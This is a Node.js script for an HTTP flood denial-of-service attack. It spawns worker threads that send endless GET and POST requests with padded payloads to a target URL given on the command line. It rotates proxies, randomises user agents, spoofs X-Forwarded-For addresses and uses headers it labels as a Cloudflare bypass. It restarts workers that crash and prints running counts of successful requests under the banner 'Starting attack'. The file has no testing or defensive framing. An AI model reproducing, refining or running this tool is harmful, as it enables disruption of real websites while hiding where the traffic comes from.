const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

// Configuration
const TARGET_URL = process.argv[2] || 'https://example.com';
const THREAD_COUNT = 12;
const PROXY_FILE = 'proxies.txt';
const MAX_RETRIES = 5;
const REQUEST_TIMEOUT = 15000;

// Realistic User-Agents
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
];

// Payloads for POST requests
const PAYLOADS = [
    JSON.stringify({ query: "search", data: Array(1000).fill("x").join("") }),
    JSON.stringify({ action: "submit", payload: Array(5000).fill("y").join("") }),
    `username=${Array(1000).fill('a').join('')}&password=${Array(1000).fill('b').join('')}`,
    `search=${encodeURIComponent(Array(5000).fill('test').join(' '))}`
];

// Cloudflare bypass headers
const CLOUDFLARE_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': USER_AGENTS[0]
};

// Load proxies
let proxies = [];
if (fs.existsSync(PROXY_FILE)) {
    proxies = fs.readFileSync(PROXY_FILE, 'utf-8')
        .split('\n')
        .map(p => p.trim())
        .filter(p => p.length > 0);
}

// Random selection helpers
function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomProxy() {
    return proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
}

function getRandomPayload() {
    return PAYLOADS[Math.floor(Math.random() * PAYLOADS.length)];
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Advanced request function with proxy support
function makeRequest(targetUrl, useProxy = true) {
    const parsedUrl = url.parse(targetUrl);
    const isHttps = parsedUrl.protocol === 'https:';
    const proxy = useProxy ? getRandomProxy() : null;
    
    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.path || '/',
        method: Math.random() > 0.5 ? 'GET' : 'POST',
        headers: {
            ...CLOUDFLARE_HEADERS,
            'User-Agent': getRandomUserAgent(),
            'X-Forwarded-For': `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': targetUrl,
            'Origin': `${parsedUrl.protocol}//${parsedUrl.hostname}`
        },
        timeout: REQUEST_TIMEOUT,
        agent: false
    };

    if (options.method === 'POST') {
        options.headers['Content-Type'] = Math.random() > 0.5 ? 'application/json' : 'application/x-www-form-urlencoded';
        options.headers['Content-Length'] = Buffer.byteLength(getRandomPayload());
    }

    return new Promise((resolve) => {
        let retries = 0;
        
        const attemptRequest = () => {
            let req;
            let socket;
            
            const cleanup = () => {
                if (socket) {
                    socket.destroy();
                }
            };
            
            const onError = (err) => {
                cleanup();
                if (retries < MAX_RETRIES) {
                    retries++;
                    setTimeout(attemptRequest, getRandomInt(100, 500));
                } else {
                    resolve(false);
                }
            };
            
            const onTimeout = () => {
                cleanup();
                if (retries < MAX_RETRIES) {
                    retries++;
                    setTimeout(attemptRequest, getRandomInt(100, 500));
                } else {
                    resolve(false);
                }
            };
            
            try {
                if (proxy && useProxy) {
                    const proxyParts = proxy.split(':');
                    const proxyOptions = {
                        host: proxyParts[0],
                        port: parseInt(proxyParts[1] || '80'),
                        method: 'CONNECT',
                        path: `${parsedUrl.hostname}:${options.port}`,
                        headers: {
                            'Host': parsedUrl.hostname,
                            'User-Agent': options.headers['User-Agent'],
                            'Proxy-Connection': 'Keep-Alive'
                        }
                    };
                    
                    const proxyReq = http.request(proxyOptions);
                    proxyReq.on('connect', (res, proxySocket) => {
                        if (res.statusCode === 200) {
                            if (isHttps) {
                                socket = tls.connect({
                                    socket: proxySocket,
                                    servername: parsedUrl.hostname,
                                    rejectUnauthorized: false
                                }, () => {
                                    req = https.request(options, (res) => {
                                        res.on('data', () => {});
                                        res.on('end', () => resolve(true));
                                    });
                                    
                                    req.on('error', onError);
                                    req.on('timeout', onTimeout);
                                    req.setTimeout(REQUEST_TIMEOUT);
                                    
                                    if (options.method === 'POST') {
                                        req.write(getRandomPayload());
                                    }
                                    req.end();
                                });
                                
                                socket.on('error', onError);
                            } else {
                                socket = proxySocket;
                                req = http.request(options, (res) => {
                                    res.on('data', () => {});
                                    res.on('end', () => resolve(true));
                                });
                                
                                req.on('error', onError);
                                req.on('timeout', onTimeout);
                                req.setTimeout(REQUEST_TIMEOUT);
                                
                                if (options.method === 'POST') {
                                    req.write(getRandomPayload());
                                }
                                req.end();
                            }
                        } else {
                            onError(new Error('Proxy connection failed'));
                        }
                    });
                    
                    proxyReq.on('error', onError);
                    proxyReq.end();
                } else {
                    const transport = isHttps ? https : http;
                    req = transport.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => resolve(true));
                    });
                    
                    req.on('error', onError);
                    req.on('timeout', onTimeout);
                    req.setTimeout(REQUEST_TIMEOUT);
                    
                    if (options.method === 'POST') {
                        req.write(getRandomPayload());
                    }
                    req.end();
                }
            } catch (err) {
                onError(err);
            }
        };
        
        attemptRequest();
    });
}

// Worker thread function
if (!isMainThread) {
    (async () => {
        let successCount = 0;
        let errorCount = 0;
        
        while (true) {
            try {
                const success = await makeRequest(workerData.targetUrl, workerData.useProxy);
                if (success) {
                    successCount++;
                    if (successCount % 100 === 0) {
                        parentPort.postMessage({ type: 'status', successCount, errorCount });
                    }
                } else {
                    errorCount++;
                }
            } catch (err) {
                errorCount++;
            }
        }
    })();
}

// Main thread
if (isMainThread) {
    console.log(`[+] Starting attack on ${TARGET_URL}`);
    console.log(`[+] Using ${proxies.length} proxies`);
    console.log(`[+] Spawning ${THREAD_COUNT} worker threads`);
    
    const workers = [];
    let totalSuccess = 0;
    let totalErrors = 0;
    
    // Create workers
    for (let i = 0; i < THREAD_COUNT; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                targetUrl: TARGET_URL,
                useProxy: proxies.length > 0
            }
        });
        
        worker.on('message', (msg) => {
            if (msg.type === 'status') {
                totalSuccess += msg.successCount;
                totalErrors += msg.errorCount;
                console.log(`[+] Requests: ${totalSuccess} successful, ${totalErrors} failed`);
            }
        });
        
        worker.on('error', (err) => {
            console.error(`[!] Worker error: ${err.message}`);
        });
        
        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`[!] Worker stopped with exit code ${code}`);
                // Restart worker
                workers.push(new Worker(__filename, {
                    workerData: {
                        targetUrl: TARGET_URL,
                        useProxy: proxies.length > 0
                    }
                }));
            }
        });
        
        workers.push(worker);
    }
    
    // Status update interval
    setInterval(() => {
        console.log(`[+] Total requests: ${totalSuccess} successful, ${totalErrors} failed`);
    }, 5000);
    
    // Handle termination
    process.on('SIGINT', () => {
        console.log('\n[!] Stopping workers...');
        workers.forEach(worker => worker.terminate());
        process.exit();
    });
}
